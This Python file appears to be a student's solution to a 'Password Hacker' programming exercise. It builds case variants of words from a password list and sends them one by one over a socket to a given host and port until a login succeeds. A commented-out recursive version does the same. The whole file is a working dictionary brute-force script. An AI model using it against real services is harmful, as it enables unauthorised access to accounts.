import socket
import argparse
import itertools


file = open(
    'C:\\Users\\nzaye\\Desktop\\JetBrains\\PythonProjects\\Password Hacker\\Password '
    'Hacker\\task\\hacking\\passwords.txt', 'r')

pass_list = []

for word in file:
    pass_list.append(list(map(lambda x: ''.join(x),
                              itertools.product(*([letter.lower(), letter.upper()] for letter in word.strip())))))

file.close()

parser = argparse.ArgumentParser()

# adding arguments:

parser.add_argument('hostname')
parser.add_argument('port')
args = parser.parse_args()

client_socket = socket.socket()
address = (args.hostname, int(args.port))
client_socket.connect(address)

for password_list in pass_list:
    for password in password_list:
        try:

            client_socket.send(password.encode())
            response = (client_socket.recv(1024)).decode()
            if response == "Connection success!":
                print(password)
                break
        except ConnectionAbortedError:
            break

client_socket.close()


# Much better and clean Solution

# def cases(s):
#
#     lst = []
#
#     s_tuples = list(zip(s.lower(), s.upper()))
#
#     def recursive(tup, n, combo=""):
#
#         # base case: no more tuples.
#         if n == 0:
#             lst.append(combo)
#
#         else:
#             for i in range(2):
#                 c = tup[0][i]
#                 recursive(tup[1:], n - 1, combo + c)
#
#     recursive(s_tuples, len(s))
#
#     return lst
#
#
# def hacker():
#     arguments = sys.argv
#
#     with socket.socket() as client:
#         client.connect((arguments[1], int(arguments[2])))
#
#         with open(f"{os.path.join(os.getcwd(), 'passwords.txt')}", "r") as passwords:
#
#             for password in passwords.read().splitlines():
#                 combinations = cases(password)
#                 for c in combinations:
#                     client.send(c.encode())
#                     if client.recv(1024).decode() == "Connection success!":
#                         return c
#
#
# if __name__ == "__main__":
#     print(hacker())